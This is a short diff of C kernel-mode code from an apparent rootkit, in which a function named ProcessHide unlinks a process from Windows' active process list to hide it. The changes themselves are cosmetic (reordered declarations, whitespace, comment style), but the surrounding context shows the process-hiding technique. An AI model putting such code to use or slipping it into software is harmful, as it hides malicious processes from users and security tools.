@@ -8,10 +8,10 @@ NTSTATUS ProcessHide(
 ) {
 	PEPROCESS     EProcess	     = NULL;
 	NTSTATUS      NtStatus	     = STATUS_UNSUCCESSFUL;
-	ULONG         ProcessListOfs = 0;
-	ULONG	      ProcessLockOfs = 0;
 	PLIST_ENTRY   ProcessActList = NULL;
 	PVOID         ProcessLock    = NULL;
+	ULONG         ProcessListOfs = 0;
+	ULONG	      ProcessLockOfs = 0;
 
 	/* resolve offsets */
 	if ( ( ! ( ProcessLockOfs = ProcessLockOffset() ) ) || 
@@ -59,7 +59,7 @@ NTSTATUS ProcessHide(
 	}
 
 	/* remove process from double linked list */
-	DoubleLinkedRemove( ProcessActList ); 
+	DoubleLinkedRemove( ProcessActList );
 
 CLEANUP:
 	if ( ProcessLock ) {
@@ -74,8 +74,9 @@ CLEANUP:
 	return NtStatus;
 }
 
-/*
- * get process lock offset based on current windows version
+/**
+ * @brief
+ *	get process lock offset based on current windows version
  */
 ULONG ProcessLockOffset(
 	VOID
